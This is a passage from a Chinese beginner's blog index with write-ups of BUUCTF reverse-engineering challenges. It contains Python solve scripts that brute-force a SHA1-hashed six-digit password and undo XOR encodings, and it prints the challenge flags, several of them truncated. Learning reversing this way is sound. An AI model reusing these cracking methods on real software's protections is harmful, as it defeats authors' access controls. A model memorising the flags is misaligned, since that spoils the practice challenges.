ord(a[i]))print(b) 得到 flag：MRCTF{@_R3@1ly_E2_R3verse!} 题目来源：BUUCTF 在线评测 (buuoj.cn)–Xor","tags":["reverse"],"categories":["wp"]},{"title":"CrackRTF","path":"/2022/03/12/CrackRTF/","content":"首先我想说，这道题对于我这个小白来说简直是难出天际，还是看了好多大佬的 wp 才能勉强做出来，中间仍然有一些没理解的地方 首先照例拿到 exeinfope 中查看，是 32 位程序，拿到 IDA PRO 中查找主函数，主函数如下： 真的好长，我看了好久吧久才看懂它的大概思路 # 第一部分 看这一部分，我们可以知道，它这个密码是 6 位数，而且大于 100000 关键来了，这个六位数我们要把它和 @DBApp 拼接，然后放到 sub_40100A 这个函数中进行计算，计算得出的结果要等于 6E32D0943418C2C33385BC35A1470250DD8923A9 # 引申知识点 atoi 函数的作用是将字符串转化为整型 strcmpi 函数是将两个字符串进行对比，并且忽略大小写的影响，例如 Yes 和 YES 的输出结果仍为 1，但在这里的 strcmpi 函数前有一个！，输出结果应该是 0，按理来说不会运行下面的代码，这里有点没搞明白 我们点开 sub_40100A 函数： 看见了很多新的东西，我就是从这里开始崩溃的… 但是不能慌，我们可以上网查，但是上网查了之后也没怎么懂，看了大佬的 wp 之后才理解，这是一个哈希加密，然后一般的范围是小于 999999（这里我没太明白，我也没理解这个范围是怎么求的） # 脚本 1 所以我们可以在这个范围里面进行爆破解密，脚本如下： 12345678910import hashlibstr1 = &#x27;@DBApp&#x27;for i in range(100000, 999999): psw = str(i)+str1 x = hashlib.sha1(psw.encode(&quot;utf8&quot;)) y = x.hexdigest() if &quot;6e32d0943418c2c33385bc35a1470250dd8923a9&quot; == y: print(psw) break # 补充 encode 是编码，后面的括号内是其编码的格式，这里就是将得到的 psw 编码为 utf8 格式 x.hexdigest () 是将 y 转换成 16 进制格式进而与 6e32d0943418c2c33385bc35a1470250dd8923a9 进行计算，如果去掉 hex 就是十进制 爆破后得到 123321@DBApp，密码就是前六位也就是 123321（说实话做到这我人已经懵了，光是我自己我基本做不出来，虽然脚本是自己写的，但思路都是参照大佬的 wp 来的） # 第二部分 第一个密码终于解出来了，现在要解第二个密码 其实这个 sub_401019 函数和第一个差不多，但是我们没有范围，所以不能爆破，只能跳过了 但是不要灰心，“亲爱的” 出题人在后面又给了我们两个函数噢！ 我们点开 sub_40100F 这个函数进去，会发现又有一大堆新的东西！！完全看不懂是什么 在百度查了一下 FindResourceA 这个函数，我看不太懂，我就直接移植大佬的解释吧 呃，其实还是不太理解哈哈哈哈 现在我们看到 sub_401005 这个函数 上面 FindResourceA 函数传递的值会传到这里，进行抑或运算，在这里我们需要用到一个叫做 Resourse Hacker 的软件来查看 框出来的数字就是我们要进行抑或运算的六位数字的一部分 # 脚本 2 因为最后会生成一个.rtf 文件，而.rtf 文件的标识符前六位是 {\\rtf1，所以我们就把 0x05,0x7D,0x41,0x15,0x26,0x01 和 {\\rtf1 进行抑或运算，写一个脚本进行计算 123456789a = [0x05, 0x7D, 0x41, 0x15, 0x26, 0x01]b = &#x27;&#x27;c = &#x27;&#123;\\\\rtf1&#x27;for i in range(0, len(a)): b += chr(ord(c[i]) ^ a[i])print(b) 得到第二个密码为～！3a@0 最后运行程序，输入两次密码，会生成一个.rtf 文件在根目录 点开即得到 Flag {N0_M0re_Free_Bugs} 题目来源：BUUCTF 在线评测 (buuoj.cn)–CrackRTF","tags":["reverse"],"categories":["wp"]},{"title":"JustRE","path":"/2022/03/12/JustRE/","content":"还是照例用 exeinfope 打开，发现是 32 位程序，那么我们直接用 32 位 IDA PRO 打开即可，ctrl+f 查找 main 函数 F5 看伪代码发现没啥东西，于是 shift+F12 查看字符串，拉到最底下的时候发现一个 flag（熟悉的配方） ctrl+x 跟进以下查看函数 我们注意以下这一行 一开始我还懵了半天，后面过了一会再看，咦，这不就是 c 语言的 printf 函数吗哈哈哈哈，所以只要把 19999 和 0 代替两个 % d 就可以了，over flag：BJD 题目来源：BUUCTF 在线评测 (buuoj.cn)–JustRE","tags":["reverse"],"categories":["wp"]},{"title":"pyre","path":"/2022/03/12/pyre/","content":"# 1. 审计代码 拿到题目后发现这是一个 pyc 文件，是一道 python 逆向题，拿到在线反编译器中反编译一下，可以得到以下代码： 12345678910111213141516171819202122232425262728293031323334print &quot;Welcome to Re World!&quot;print &quot;Your input1 is your flag~&quot;l = len(input1)for i in range(l): num = ((input1[i] + i) % 128 + 128) % 128 code += numfor i in range(l - 1): code[i] = code[i] ^ code[i + 1]print codecode = [ &quot;\\x1f&quot;, &quot;\\x12&quot;, &quot;\\x1d&quot;, &quot;(&quot;, &quot;0&quot;, &quot;4&quot;, &quot;\\x01&quot;, &quot;\\x06&quot;, &quot;\\x14&quot;, &quot;4&quot;, &quot;,&quot;, &quot;\\x1b&quot;, &quot;U&quot;, &quot;?&quot;, &quot;o&quot;, &quot;6&quot;, &quot;*&quot;, &quot;:&quot;, &quot;\\x01&quot;, &quot;D&quot;, &quot;;&quot;, &quot;%&quot;, &quot;\\x13&quot;,] 我们只要逐步反向写脚本就可以得到 flag，不过我在写脚本的时候想了很久，一直都没搞出来 # 2. 确定思路 首先是这一部分： 12for i in range(l - 1): code[i] = code[i] ^ code[i + 1] 这行代码的意思是将 code 从第一位开始，和后一位进行异或运算，一直到倒数第二位，那我们要还原这一步的话我们就要反过来抑或，就是这里我卡了很久，不知道怎么解决，知道看到大佬的 wp，发现可以这样： 12for i in range(l-2, -1, -1): code[i] = chr(ord(code[i]) ^ ord(code[i + 1])) # 3. 写出脚本 后面那步还比较好理解，把式子化简以下就可以，最后完整的脚本如下： 1234567891011code = [&#x27;\\x1f&#x27;, &#x27;\\x12&#x27;, &#x27;\\x1d&#x27;, &#x27;(&#x27;, &#x27;0&#x27;, &#x27;4&#x27;, &#x27;\\x01&#x27;, &#x27;\\x06&#x27;, &#x27;\\x14&#x27;, &#x27;4&#x27;, &#x27;,&#x27;, &#x27;\\x1b&#x27;,&#x27;U&#x27;, &#x27;?&#x27;, &#x27;o&#x27;, &#x27;6&#x27;, &#x27;*&#x27;, &#x27;:&#x27;, &#x27;\\x01&#x27;, &#x27;D&#x27;, &#x27;;&#x27;, &#x27;%&#x27;, &#x27;\\x13&#x27;]flag = &#x27;&#x27;l = len(code)for i in range(l-2, -1, -1): code[i] = chr(ord(code[i]) ^ ord(code[i + 1]))for i in range(0, len(code)): flag += chr((ord(code[i]) - i) % 128)print(flag) flag：GWHT 题目来源：BUUCTF 在线评测 (buuoj.cn)–pyre","tags":["reverse"],"categories":["wp"]},{"title":"luckguy","path":"/2022/03/11/luckguy/","content":"首先用 exeinfope 查壳，但没什么结果，所以我尝试先直接用 64 位 ida pro 打开，然后直接找到主函数 还是没什么发现，于是就 shift+F12 看查看字符串，看到一个疑似 flag 的字符串 双击点进去，ctrl+x 跟进一下，F5 查看函数 在 case1 中看到 flag 是 s 和 f1、f2 拼接，可以知道 flag 的前一部分是 GXY {do_not_ 往后看，在 case4 中又发现得到的前部分还要和 s 拼接，所以剩下的就只要求出后一部分 flag 就可以了 不难看出，在 case5 中要将 s 进行一系列计算，s 正好可以分为一个八位的 16 进制数，只要将这 8 位 16 进制数进行以下计算就行了，用 python 写个脚本即可得出（要注意要将得到的字符串反向） 得到后一部分 flag 拼接得到最终的 flag： GXY 题目来源：BUUCTF 在线评测 (buuoj.cn)–luck_guy","tags":["reverse"],"categories":["wp"]},{"title":"关于","path":"/about/index.html","content":"欢迎来到阿翰的博客，此博客用来发布平时刷题写的题解或者是一些学到的新知识，本人是个刚入门不久的新手，内容干货可能不那么多哈哈哈，如果博客中有错误或者建议修改的地方，欢迎大家加我 QQ 进行指正：2217018023，希望所有人都一起加油一起变强！"},{"title":"友情链接","path":"/friends/index.html","content":"AjiemikeyWchTuytkgortermRwJunshangwendada"}]